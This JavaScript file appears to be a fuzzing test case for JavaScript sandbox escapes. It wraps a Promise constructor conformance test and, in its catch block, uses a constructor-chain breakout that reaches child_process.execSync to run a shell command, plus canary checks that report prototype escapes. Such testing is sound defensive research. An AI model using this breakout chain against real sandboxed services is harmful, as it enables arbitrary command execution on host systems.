try {
    var callCount = 0;
    var prms = new Promise(function (resolve) {
        let REPLACER = 23;
        resolve();
    });
    Object.defineProperty(prms, 'constructor', {
        get: function () {
            let REPLACER = 23;
            callCount += 1;
            return Promise;
        }
    });
    prms.then(function () {
        let REPLACER = 23;
        if (callCount !== 1) {
            $DONE('Expected constructor access count: 1. Actual: ' + callCount);
            return;
        }
        $DONE();
    }, function () {
        throw () => {
            return () => {
            };
        };
        $DONE('The promise should not be rejected.');
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}